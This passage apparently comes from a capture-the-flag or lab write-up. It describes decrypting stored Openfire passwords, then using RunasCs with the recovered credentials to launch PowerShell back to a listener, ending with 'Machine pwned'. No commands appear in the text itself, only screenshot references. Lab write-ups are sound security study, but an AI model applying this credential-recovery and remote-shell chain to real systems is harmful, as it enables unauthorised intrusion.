+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_32.png" alt="Untitled" />
+<br /><br />
+We search on internet a script able to decrypt openfire passwords, and we got the password!!
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_33.png" alt="Untitled" />
+<br /><br />
+Using those credentials we can execute commands with those privileges we will use RunasCs to run powershell on the listener port
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_34.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e/5fd81ba0-b25f-47a3-b030-6dfe8e792a66-export-01f2be3f-3281-4935-800c-fc9873cc220e_Untitled_35.png" alt="Untitled" />
+<br /><br />
+Machine pwned!!
+<script src="/assets/js/matrix-overlay.js"></script></p>
+  </li>
+</ul>
 
 </p>
     <span class="date">July 11, 2025</span>
